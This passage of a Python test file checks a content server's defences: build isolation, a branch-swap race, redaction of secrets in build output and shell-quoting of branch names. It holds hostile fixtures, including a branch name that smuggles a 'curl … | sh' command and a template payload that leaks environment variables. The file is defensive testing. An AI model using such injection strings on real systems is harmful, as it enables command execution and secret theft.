                "change", "origin/main", ["+refs/heads/main:refs/remotes/origin/main"])
            try:
                with self.as_user("alice"):
                    with self.assertRaisesRegex(ValueError, "server busy"):
                        srv.tool_propose_change({"slug": "busy", "body": "b"})
            finally:
                srv._remove_work_worktree(held)
            with self.as_user("alice"):
                self.assertTrue(srv.tool_propose_change({"slug": "busy", "body": "b"})["proposed"])

    def test_sweep_removes_worktrees_of_dead_servers_only(self) -> None:
        dead = subprocess.Popen(["true"])
        dead.wait()
        stale = self.work / ".tenants" / f".work-change-{dead.pid}-{'a' * 12}"
        live = self.work / ".tenants" / f".work-change-{os.getppid()}-{'b' * 12}"
        for d in (stale, live):
            self.git(self.work, "worktree", "add", "-q", "--detach", str(d), "main")
        removed = srv.sweep_stale_worktrees()
        self.assertEqual(removed, [stale.name])
        self.assertFalse(stale.exists())
        self.assertTrue(live.exists())
        self.git(self.work, "worktree", "remove", "--force", str(live))


class BuildIsolationTest(GateCase):
    """X2 (pinned sha) and the env leak (cleared build environment)."""

    def test_x2_revise_checks_and_builds_the_same_commit(self) -> None:
        """X2: the branch is moved to a harmless tip after checkout; the
        checks must still run against the commit that was checked out."""
        b = BranchContentTest.item_branch
        benign_branch = b(self, "tt")
        benign = self.git(None, "--git-dir", str(self.origin), "rev-parse", benign_branch)
        self.git(self.work, "switch", "-q", "agent/tt")
        (self.work / "build.rs").write_text("fn main() {}\n")
        self.git(self.work, "add", "build.rs")
        self.git(self.work, "commit", "-q", "-m", "evil", who="dave")
        self.git(self.work, "push", "-q", "origin", "agent/tt")
        self.git(self.work, "switch", "-q", "main")
        real_add = srv._add_work_worktree

        def add(kind, rev, fetch):
            p = real_add(kind, rev, fetch)
            # A concurrent call fetches after the attacker moved the branch
            # back to the harmless tip.
            self.git(None, "--git-dir", str(self.origin), "update-ref",
                     "refs/heads/agent/tt", benign)
            srv._git("fetch", "--quiet", "origin",
                     "+refs/heads/agent/tt:refs/remotes/origin/agent/tt")
            return p
        with mock.patch.object(srv, "_add_work_worktree", add), self.as_user("bob"):
            with self.assertRaisesRegex(ValueError, "outside content/posts/tt.*build.rs"):
                srv.tool_revise_proposal({"slug": "tt", "body": "y\n"})
        self.assertEqual(self.cargo_calls, [], "nothing was built")

    def test_revise_push_is_leased_to_the_checked_commit(self) -> None:
        BranchContentTest.item_branch(self, "lease")
        real_add = srv._add_work_worktree

        def add(kind, rev, fetch):
            p = real_add(kind, rev, fetch)
            # Someone pushes to the branch while the revise runs.
            self.commit_on("agent/lease", "dave", "late.md", server=False)
            return p
        with mock.patch.object(srv, "_add_work_worktree", add), self.as_user("bob"):
            with self.assertRaisesRegex(ValueError, "push failed"):
                srv.tool_revise_proposal({"slug": "lease", "body": "y\n"})

    def leaky_build(self, cmd, kw):
        """Stand-in for the engine: a template calling
        throw(message=get_env(name="LEAK")) fails with the value."""
        env = kw.get("env") or os.environ
        return subprocess.CompletedProcess(
            cmd, 1, "", f"Error: template error: {env.get('LEAK', 'unset')}\n")

    def test_env_leak_build_never_sees_server_secrets(self) -> None:
        (self.work / "templates").mkdir()
        (self.work / "templates" / "base.html").write_text("{% block content %}{% endblock %}\n")
        self.git(self.work, "add", "templates")
        self.git(self.work, "commit", "-q", "-m", "templates", who="dave")
        self.git(self.work, "push", "-q", "origin", "main")
        self.cargo_result = self.leaky_build
        secret = "s3cr3t-probe-value"
        with mock.patch.dict(os.environ, {"LEAK": secret, "GH_TOKEN": "probe-" + "y" * 20}), \
                self.as_user("alice"):
            with self.assertRaises(ValueError) as ctx:
                srv.tool_propose_template({
                    "name": "leak",
                    "body": '{{ throw(message=get_env(name="LEAK")) }}{% block content %}{% endblock %}'})
        self.assertNotIn(secret, str(ctx.exception))
        self.assertIn("unset", str(ctx.exception))
        env = self.cargo_calls[0]["env"]
        self.assertNotIn("LEAK", env)
        self.assertNotIn("GH_TOKEN", env)
        self.assertNotEqual(env["HOME"], os.environ.get("HOME"))
        self.assertEqual(env["SITE_ROOT"], str(self.cargo_calls[0]["cwd"]))
        self.assertEqual(self.cargo_calls[0]["cmd"], srv.BUILD_CMD)

    def test_build_error_output_is_redacted_and_truncated(self) -> None:
        value = "-".join(["probe", "value", "from", "env"])
        with mock.patch.dict(os.environ, {"PROBE_VAR": value}):
            res = subprocess.CompletedProcess(
                [], 1, "", "\x1b[31mred\x1b[0m\n" + "line\n" * 50 + value + "\n")
            tail = srv._build_error_tail(res)
        self.assertNotIn(value, tail)
        self.assertNotIn("\x1b", tail)
        self.assertLessEqual(len(tail.splitlines()), 15)

    def test_list_proposals_quotes_the_branch(self) -> None:
        evil = "agent/x;curl${IFS}h|sh"
        real = srv.subprocess.run

        def gh(cmd, *a, **kw):
            if isinstance(cmd, list) and cmd[:3] == ["gh", "pr", "list"]:
                return subprocess.CompletedProcess(cmd, 0, json.dumps([{
                    "number": 1, "title": "t", "headRefName": evil, "url": "u",
                    "author": {"name": "n"}, "body": ""}]), "")
            return real(cmd, *a, **kw)
        with mock.patch.object(srv.subprocess, "run", gh), \
                mock.patch.object(srv, "_proposal_field_diff", return_value=[]):
            out = srv.tool_list_proposals({})
        cmd = out["proposals"][0]["preview_command"]
        self.assertIn(shlex.quote(evil), cmd)
        self.assertNotIn(f"git switch {evil} ", cmd)


class BuildCommandTest(unittest.TestCase):
    def test_build_command_names_the_binary(self) -> None:
        """`cargo run -p build` is ambiguous (two binaries), so every server
        build names build-site, which the build crate must declare."""
        manifest = (_HERE.parent / "crates" / "build" / "Cargo.toml").read_text()
        bins = re.findall(r'(?m)^name = "([^"]+)"\s*\npath', manifest)
        self.assertIn("build-site", bins)
        self.assertEqual(srv.BUILD_CMD[-2:], ["--bin", "build-site"])

    @unittest.skipUnless(os.environ.get("PCMS_REAL_BUILD") == "1",
                         "set PCMS_REAL_BUILD=1 to run the real engine (compiles the build crate)")
    def test_real_build_runs_and_does_not_see_the_environment(self) -> None:
        site = Path(tempfile.mkdtemp(prefix="pcms-real-build-"))
        self.addCleanup(lambda: _REAL_RUN(["rm", "-rf", str(site)]))
        archive = _REAL_RUN(["git", "-C", str(_HERE.parent), "archive", "HEAD"],
                            capture_output=True)
        _REAL_RUN(["tar", "-x", "-C", str(site)], input=archive.stdout, check=True)
        with mock.patch.object(srv, "ROOT", site), \
                mock.patch.dict(os.environ, {"LEAK": "s3cr3t-probe-value"}):
            ok = srv._run_build(site)
            self.assertEqual(ok.returncode, 0, srv._build_error_tail(ok))
            self.assertTrue((site / "dist" / "index.html").exists())
            (site / "templates" / "leak.html").write_text(
                '{{ throw(message=get_env(name="LEAK")) }}\n')
            bad = srv._run_build(site)
        self.assertNotEqual(bad.returncode, 0)
        self.assertNotIn("s3cr3t-probe-value", bad.stdout + bad.stderr)


class HttpIdentityTest(unittest.TestCase):
    """Stable ids from the HTTP connectors; OIDC email only when verified."""

    @classmethod
    def setUpClass(cls) -> None:
        with mock.patch.dict(os.environ, {}):  # http_server sets PCMS_TRANSPORT
            spec = importlib.util.spec_from_file_location(
                "pcms_http_under_test", _HERE / "http_server.py")
            assert spec is not None and spec.loader is not None
            cls.http = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(cls.http)

    def test_github_identity_uses_numeric_id(self) -> None:
        with mock.patch.object(self.http, "_http_json",
                               return_value={"login": "alice", "id": 42, "email": ""}):
            ident = self.http._identity_github("t")
        self.assertEqual(ident["id"], "github:42")

    def oidc(self, claims: dict) -> dict:
        fake = types.ModuleType("jwt")
        fake.PyJWTError = Exception  # type: ignore[attr-defined]
        fake.decode = lambda *a, **k: claims  # type: ignore[attr-defined]
        with mock.patch.dict(sys.modules, {"jwt": fake}), \
                mock.patch.object(self.http, "OAUTH_ISSUER", "https://idp.example.com"), \
                mock.patch.object(self.http, "OAUTH_AUDIENCE", "post-cms"), \
                mock.patch.object(self.http, "_jwks_client", return_value=mock.Mock()):
            return self.http._identity_oidc("t")

    def test_oidc_identity_is_issuer_and_subject(self) -> None:
        ident = self.oidc({"iss": "https://idp.example.com", "sub": "u-1",
                           "preferred_username": "carol", "email": "carol@example.com",
                           "email_verified": True})
        self.assertEqual(ident["id"], "oidc:https://idp.example.com#u-1")
        self.assertEqual(ident["email"], "carol@example.com")

    def test_oidc_unverified_email_is_dropped(self) -> None:
        for verified in (False, None, "true"):
            claims = {"iss": "https://idp.example.com", "sub": "u-2",
                      "preferred_username": "carol", "email": "carol@example.com"}
            if verified is not None:
                claims["email_verified"] = verified
            with self.subTest(email_verified=verified):
                self.assertEqual(self.oidc(claims)["email"], "")


if __name__ == "__main__":
    unittest.main()
